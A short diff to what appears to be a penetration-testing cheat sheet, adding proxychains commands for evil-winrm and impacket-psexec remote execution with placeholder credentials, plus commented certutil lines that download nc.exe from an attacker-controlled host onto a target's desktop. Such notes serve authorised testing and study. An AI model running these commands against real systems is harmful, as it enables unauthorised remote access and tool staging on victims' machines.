@@ -742,7 +742,10 @@ cat /etc/proxychains4.conf
 # #socks4         127.0.0.1 9050
 # socks5  127.0.0.1 1080
 
-proxychains evil-winrm -i '<host>' -u '<username>'
+proxychains evil-winrm -i '<target ip>' -u '<username>'
+proxychains impacket-psexec "<username>":'<password>'@<target ip>
+# certutil -urlcache -split -f "<remote_file_path>" "<local_file_path>"
+# certutil -urlcache -split -f "http://<attacker ip>/nc.exe" "C:\Users\<username>\Desktop\nc.exe"
 ```
 
 additional use
